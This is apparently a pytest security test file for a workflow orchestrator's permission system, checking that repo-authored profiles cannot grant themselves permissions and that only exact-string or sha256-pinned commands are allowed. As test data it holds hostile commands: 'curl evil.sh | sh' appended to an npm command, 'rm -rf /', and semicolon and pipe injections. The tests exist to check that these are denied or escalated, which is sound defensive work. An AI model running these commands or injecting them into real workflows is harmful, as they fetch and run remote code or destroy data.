"""Security tests for workflow profile system: composed end-to-end guarantees.

These tests verify the system-level security boundaries that protect against
repo-authored code execution attacks through the workflow profile system.
Unlike test_workflow_permissions.py (which tests the authorize() matcher in
isolation), these tests exercise the composed behavior through the full
loader + merge pipeline, and assert verdicts on real composed Profiles and Permissions.

Pure tests only: tmp_path fixture repos + monkeypatch. No DB, no pool fixture.

Threat model (plan §5):
  - The repo profile (.orchestrator/workflow.yaml) is attacker-controlled: anyone
    with commit rights to the product repo can edit it.
  - The workspace manifest (in the operator's control repo) is the authority.
  - A repo file declaring `permissions:` (trying to self-authorize) must have zero
    effect — authority stays with the workspace manifest only.
  - Permission matching uses exact-string identity only: no glob, no prefix, no
    regex. A malicious command like `npm ci --no-audit && curl evil.sh | sh` must
    never match an approved `npm ci --no-audit --no-fund`.
  - Deny beats everything (allow, bypass, builtin identity).
  - sha256 pins are byte-exact promises.
"""

from __future__ import annotations

import hashlib
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest
import yaml

from orchestrator.config import Settings
from orchestrator.workflow.loader import load_effective, load_permissions
from orchestrator.workflow.merge import merge_layers, parse_profile_dict
from orchestrator.workflow.permissions import Permissions, authorize
from orchestrator.workflow.models import RequiredAction


@dataclass
class Action:
    """Local stand-in for RequiredAction. authorize() only reads .run/.builtin."""

    run: str = ""
    builtin: str = ""


def sha256_of(s: str) -> str:
    """Compute sha256 hexdigest of a UTF-8 string."""
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def _init_git_repo(path: Path) -> None:
    """Initialize a minimal git repo at path (no working tree operations)."""
    subprocess.run(
        ["git", "init"],
        cwd=path,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=path,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test User"],
        cwd=path,
        check=True,
        capture_output=True,
    )


def _write_yaml(path: Path, doc: dict) -> None:
    """Write a YAML dict to a file, creating parent dirs."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(yaml.safe_dump(doc), encoding="utf-8")


# --------------------------------------------------------------------------- #
# TEST GROUP 1: Repo profile with `permissions:` grant is ignored + warned
# --------------------------------------------------------------------------- #


class TestRepoProfilePermissionsIgnored:
    """Repo profile declaring `permissions: {allow: [...], bypass: true}` must have
    zero effect. The grant is ignored, a warning is raised, and any custom action
    still escalates (because there's no workspace grant to authorize it).

    This tests plan §2.2 ("Authority lives in the operator's workspace manifest,
    NEVER the repo profile") and §5 ("Repo-profile files can only *request*...").
    """

    def test_repo_permissions_ignored_warning_raised(self, tmp_path):
        """A malicious repo profile claiming `permissions: {allow: ["rm -rf /"],
        bypass: true}` must be ignored entirely, and a warning recorded."""

        # Initialize a git repo so load_effective can find it
        worktree = tmp_path / "wt"
        worktree.mkdir()
        _init_git_repo(worktree)

        # Create a repo profile with malicious permissions
        _write_yaml(
            worktree / ".orchestrator" / "workflow.yaml",
            {
                "permissions": {
                    "allow": ["rm -rf /"],
                    "bypass": True,
                },
                "prepare": [
                    {"run": "echo prepare", "on_fail": "block"},
                ],
            },
        )

        settings = Settings()
        profile = load_effective(settings, worktree)

        # Verify the warning was recorded
        assert any(
            "permissions" in w and "ignored" in w
            for w in profile.warnings
        ), f"Expected permissions warning, got: {profile.warnings}"

        # The repo's attempted permission grant should have had zero effect.
        # load_permissions reads only the workspace manifest, never the repo layer.
        perms = load_permissions(settings)
        assert perms == Permissions()

        # With empty permissions and a custom run action, authorize should escalate.
        action = Action(run="rm -rf /")
        assert authorize(action, perms) == "escalate"

    def test_repo_bypass_true_has_no_effect_without_workspace_grant(self, tmp_path):
        """Even if the repo profile declares `bypass: true`, without a workspace
        grant that sets bypass in the Permissions object, custom actions escalate."""

        worktree = tmp_path / "wt"
        worktree.mkdir()
        _init_git_repo(worktree)

        # Repo profile tries to enable bypass
        _write_yaml(
            worktree / ".orchestrator" / "workflow.yaml",
            {
                "permissions": {"bypass": True},
                "prepare": [{"run": "echo prepare"}],
            },
        )

        # No workspace manifest to provide a grant
        settings = Settings()
        profile = load_effective(settings, worktree)

        # load_permissions ignores the repo layer entirely
        perms = load_permissions(settings)

        # A custom run action must escalate because perms.bypass is False
        action = Action(run="arbitrary command")
        assert authorize(action, perms) == "escalate"


# --------------------------------------------------------------------------- #
# TEST GROUP 2: Shell injection via shared prefix must escalate
# --------------------------------------------------------------------------- #


class TestShellInjectionViaPrefix:
    """The canonical threat model: `npm ci --no-audit && curl evil.sh | sh`
    shares a prefix with the allowed `npm ci --no-audit --no-fund`, but must
    never match it. Prefix matching is forbidden; only exact string identity
    (after .strip()) or sha256 pin is permitted.

    This tests plan §3.2 "Permission matching (hard rule)" and plan §5 security.
    """

    def test_shell_injection_escalates(self):
        """The evil command appended with && is rejected."""
        allowed = "npm ci --no-audit --no-fund"
        evil = "npm ci --no-audit && curl evil.sh | sh"

        action = Action(run=evil)
        perms = Permissions(allow=(allowed,))
        assert authorize(action, perms) == "escalate"

    def test_semicolon_injection_escalates(self):
        """Appending ; rm -rf / to an allowed command must escalate."""
        allowed = "npm ci --no-audit --no-fund"
        evil = f"{allowed}; rm -rf /"

        action = Action(run=evil)
        perms = Permissions(allow=(allowed,))
        assert authorize(action, perms) == "escalate"

    def test_pipeline_injection_escalates(self):
        """Appending | sh to an allowed command must escalate."""
        allowed = "npm ci --no-audit --no-fund"
        evil = f"{allowed} | sh"

        action = Action(run=evil)
        perms = Permissions(allow=(allowed,))
        assert authorize(action, perms) == "escalate"


# --------------------------------------------------------------------------- #
# TEST GROUP 3: Prefix, suffix, glob probes never match exact entries
# --------------------------------------------------------------------------- #


class TestExactMatchOnly:
    """Permission matching is byte-exact only (after .strip()). No prefix
    matching, no suffix matching, no glob expansion. Glob metacharacters
    (*, ?, [, ]) in either the entry or the action are treated literally,
    not as glob patterns.

    Plan §3.2: "No glob, no prefix, no regex, no substring matching anywhere."
    """

    def test_prefix_grant_does_not_match_longer_action(self):
        """An allow entry 'npm' does not match action 'npm ci --no-audit --no-fund'."""
        action = Action(run="npm ci --no-audit --no-fund")
        perms = Permissions(allow=("npm",))
        assert authorize(action, perms) == "escalate"

    def test_suffix_in_action_does_not_match_prefix_grant(self):
        """Allow entry 'npm ci' does not match action 'npm ci --extra'."""
        action = Action(run="npm ci --extra")
        perms = Permissions(allow=("npm ci",))
        assert authorize(action, perms) == "escalate"

    def test_action_with_trailing_semicolon_does_not_match(self):
        """Allow entry 'npm ci --no-audit --no-fund' does not match action
        'npm ci --no-audit --no-fund; rm -rf /'."""
        allowed = "npm ci --no-audit --no-fund"
        action = Action(run=f"{allowed}; rm -rf /")
        perms = Permissions(allow=(allowed,))
        assert authorize(action, perms) == "escalate"

    def test_glob_chars_in_action_literal_not_expanded(self):
        """Action 'npm ci*' (containing a literal *) does not match allow
        entry 'npm ci' — glob chars are not expanded."""
        action = Action(run="npm ci*")
        perms = Permissions(allow=("npm ci",))
        assert authorize(action, perms) == "escalate"

    def test_glob_chars_in_entry_literal_not_expanded(self):
        """Allow entry 'npm ci*' does not match action 'npm ci --no-audit --no-fund'.
        The * in the entry is literal, not a glob wildcard."""
        action = Action(run="npm ci --no-audit --no-fund")
        perms = Permissions(allow=("npm ci*",))
        assert authorize(action, perms) == "escalate"

    def test_glob_bracket_literal_in_entry(self):
        """Allow entry 'test[0-9]' is treated as a literal string (bracket matching
        glob syntax), not as a pattern. Action 'test5' does not match."""
        action = Action(run="test5")
        perms = Permissions(allow=("test[0-9]",))
        assert authorize(action, perms) == "escalate"

    def test_question_mark_glob_literal_in_entry(self):
        """Allow entry 'npm ci ?' is literal (not a glob pattern for single char)."""
        action = Action(run="npm ci x")
        perms = Permissions(allow=("npm ci ?",))
        assert authorize(action, perms) == "escalate"


# --------------------------------------------------------------------------- #
# TEST GROUP 4: Deny beats allow, bypass, and builtin identity
# --------------------------------------------------------------------------- #


class TestDenyPrecedence:
    """Deny is absolute: a deny entry overrides allow, bypass, and even builtin
    identity. This is the operator's kill-switch to block a specific dangerous
    command even after granting bypass or even if it happens to be a builtin.

    Plan precedence rule (permissions.py):
      1. deny match  -> 'deny'   (beats EVERYTHING)
      2. builtin set -> 'allow'
      3. bypass      -> 'allow'
      4. run exact match -> 'allow'
      5. otherwise   -> 'escalate'
    """

    def test_deny_beats_allow(self):
        """Same string in both allow and deny → deny wins."""
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=cmd)
        perms = Permissions(allow=(cmd,), deny=(cmd,))
        assert authorize(action, perms) == "deny"

    def test_deny_beats_bypass(self):
        """Even with bypass=True, a deny entry kills the action."""
        cmd = "curl evil.sh | sh"
        action = Action(run=cmd)
        perms = Permissions(bypass=True, deny=(cmd,))
        assert authorize(action, perms) == "deny"

    def test_deny_beats_builtin_identity(self):
        """A builtin action can be denied by name. Deny overrides the
        engine's built-in trust."""
        action = Action(builtin="node-deps-reconcile")
        perms = Permissions(deny=("node-deps-reconcile",))
        assert authorize(action, perms) == "deny"

    def test_deny_with_other_allow_entries(self):
        """A deny entry works even when other entries are in allow list."""
        dangerous = "rm -rf /"
        safe = "npm ci --no-audit --no-fund"
        action = Action(run=dangerous)
        perms = Permissions(
            allow=(safe,),
            deny=(dangerous,),
        )
        assert authorize(action, perms) == "deny"

    def test_deny_with_strip_normalization(self):
        """Deny matching also uses symmetric .strip(), not just exact bytes."""
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=f"  {cmd}  ")
        perms = Permissions(deny=(cmd,))
        assert authorize(action, perms) == "deny"


# --------------------------------------------------------------------------- #
# TEST GROUP 5: SHA256 pins are byte-exact promises
# --------------------------------------------------------------------------- #


class TestSha256Pins:
    """A sha256 pin in the allow list is a byte-exact promise: the action's run
    string (exact UTF-8 bytes, no normalization or stripping) must match the
    pinned digest. A different string's digest does not match. Malformed pin
    entries (bad hex, missing colon, etc.) never allow.

    Plan §3.2: "sha256:<hexdigest of the exact run string> pin"
    """

    def test_correct_sha256_pin_allows(self):
        """A correctly computed pin for the exact run string allows the action."""
        cmd = "npm run build:contracts"
        action = Action(run=cmd)
        digest = sha256_of(cmd)
        perms = Permissions(allow=(f"sha256:{digest}",))
        assert authorize(action, perms) == "allow"

    def test_wrong_sha256_pin_escalates(self):
        """A pin computed over a different string does not match."""
        cmd = "npm run build:contracts"
        action = Action(run=cmd)
        wrong_digest = sha256_of("a different command")
        perms = Permissions(allow=(f"sha256:{wrong_digest}",))
        assert authorize(action, perms) == "escalate"

    def test_sha256_pin_exact_bytes_not_stripped(self):
        """A pin is computed over the exact run string bytes, with no .strip()
        normalization. Whitespace differences that a plain-string entry would
        tolerate must break the pin match."""
        padded = "  echo hi  "
        action = Action(run=padded)

        # Pin computed over the stripped variant does NOT match the padded action
        wrong_digest = sha256_of(padded.strip())
        perms_wrong = Permissions(allow=(f"sha256:{wrong_digest}",))
        assert authorize(action, perms_wrong) == "escalate"

        # Pin computed over the exact padded string DOES match
        correct_digest = sha256_of(padded)
        perms_correct = Permissions(allow=(f"sha256:{correct_digest}",))
        assert authorize(action, perms_correct) == "allow"

    def test_sha256_pin_hex_case_insensitive(self):
        """The hex digest itself is matched case-insensitively (both upper and
        lowercase hex are valid), but the digest bytes must still match exactly."""
        cmd = "go test ./..."
        action = Action(run=cmd)
        digest_lower = sha256_of(cmd)
        digest_upper = digest_lower.upper()

        perms_lower = Permissions(allow=(f"sha256:{digest_lower}",))
        assert authorize(action, perms_lower) == "allow"

        perms_upper = Permissions(allow=(f"sha256:{digest_upper}",))
        assert authorize(action, perms_upper) == "allow"

    def test_sha256_pin_malformed_junk_hex_does_not_allow(self):
        """A malformed pin (junk hex, truncated digest, wrong prefix) never allows."""
        cmd = "npm test"
        action = Action(run=cmd)

        # Junk hex (not a valid sha256)
        perms_junk = Permissions(allow=(f"sha256:gggggggg",))
        assert authorize(action, perms_junk) == "escalate"

        # Truncated digest
        real_digest = sha256_of(cmd)
        perms_truncated = Permissions(allow=(f"sha256:{real_digest[:10]}",))
        assert authorize(action, perms_truncated) == "escalate"

        # Missing colon
        perms_no_colon = Permissions(allow=(f"sha256{real_digest}",))
        assert authorize(action, perms_no_colon) == "escalate"

    def test_sha256_pin_deny_beats_allow_plain(self):
        """A deny pin beats an allow plain-string entry."""
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=cmd)
        digest = sha256_of(cmd)

        perms = Permissions(
            allow=(cmd,),  # Allowed as plain string
            deny=(f"sha256:{digest}",),  # Denied as pin
        )
        assert authorize(action, perms) == "deny"

    def test_sha256_pin_vs_different_command_exact_name_match(self):
        """Two different commands with the same name (like two different 'npm ci'
        variants) have different digests; a pin for one does not authorize the other."""
        cmd1 = "npm ci --no-audit --no-fund"
        cmd2 = "npm ci --no-fund"
        action = Action(run=cmd2)

        digest1 = sha256_of(cmd1)
        perms = Permissions(allow=(f"sha256:{digest1}",))
        assert authorize(action, perms) == "escalate"


# --------------------------------------------------------------------------- #
# Bonus: Integration test combining multiple rules
# --------------------------------------------------------------------------- #


class TestSecurityIntegration:
    """Real-world scenarios combining multiple security rules."""

    def test_deny_overrides_sha256_pin_in_allow(self):
        """Deny beats allow, even when allow uses a sha256 pin."""
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=cmd)
        digest = sha256_of(cmd)

        perms = Permissions(
            allow=(f"sha256:{digest}",),
            deny=(cmd,),  # Exact deny
        )
        assert authorize(action, perms) == "deny"

    def test_malicious_profile_with_bypass_and_evil_command(self):
        """A repo profile trying to (a) enable bypass and (b) request a dangerous
        action must have both attempts blocked when the workspace manifest doesn't
        grant either."""

        allowed_cmd = "npm ci --no-audit --no-fund"
        evil_cmd = "npm ci --no-audit && curl evil.sh | sh"

        # Empty workspace manifest (no permissions grant)
        perms = Permissions()

        # Repo attempts to request the evil command
        action = Action(run=evil_cmd)
        assert authorize(action, perms) == "escalate"

        # With bypass=True, it grants the evil command: bypass is blanket operator
        # trust and allows any action; only a deny entry would block it
        perms_bypass = Permissions(bypass=True)
        assert authorize(action, perms_bypass) == "allow"

        # But an allowed command with bypass is permitted
        safe_action = Action(run=allowed_cmd)
        assert authorize(safe_action, perms_bypass) == "allow"
